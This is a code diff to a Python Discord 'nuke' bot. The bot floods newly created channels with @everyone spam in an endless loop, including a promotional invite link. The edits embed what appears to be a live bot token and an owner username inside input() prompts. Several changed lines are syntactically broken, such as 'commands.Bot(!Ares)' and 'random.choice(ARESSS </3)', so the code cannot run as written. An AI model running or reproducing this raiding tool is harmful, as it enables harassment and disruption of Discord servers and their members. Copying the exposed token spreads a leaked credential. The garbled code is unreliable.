@@ -10,16 +10,16 @@ import asyncio
 
 
 #Bot Token 
-token = input(f"Enter Your Bot Token: ")
+token = input(f":MTM5OTk2Njc0MDU2OTM5NTI3MA.GiZ6rb.9Q7_N1tH7xFh2D4BUOUm4Wglpg3qmrPmaEcUek ")
 #Enter Prefix For Your Bot
-prefix = input(f"Enter Prefix For Your Bot: ")
+prefix = input(f"!Ares: ")
 #enter Your User id like - Example#6969
-owner = input(f"Enter Your Username With Tag: ")
+owner = input(f"petalsandverse: ")
 
-SPAM_CHANNEL =  "Nuke Test"
-SPAM_MESSAGE = "@everyone Nuked ","@everyone Cry About it","@everyone  Beamed @everyone ","@everyone Nuked "
+SPAM_CHANNEL =  "ARES </3"
+SPAM_MESSAGE = "@everyone NUKED BY ARES </3 ","@here @everyone sorry po </3","@everyone join https://discord.gg/vREWjmJP @everyone nuke ko daw? </3 ","@everyone nuked po kayo </3 "
 
-client = commands.Bot(command_prefix=prefix)
+client = commands.Bot(!Ares)
 
   
 print('''
@@ -113,8 +113,8 @@ async def nuke(ctx):
     return
 
 @client.event
-async def on_guild_channel_create(channel):
+async def on_guild_channel_create(channel): Ares </3
   while True:
-    await channel.send(random.choice(SPAM_MESSAGE))
+    await channel.send(random.choice(ARESSS </3))
 
 client.run(token, bot=True)
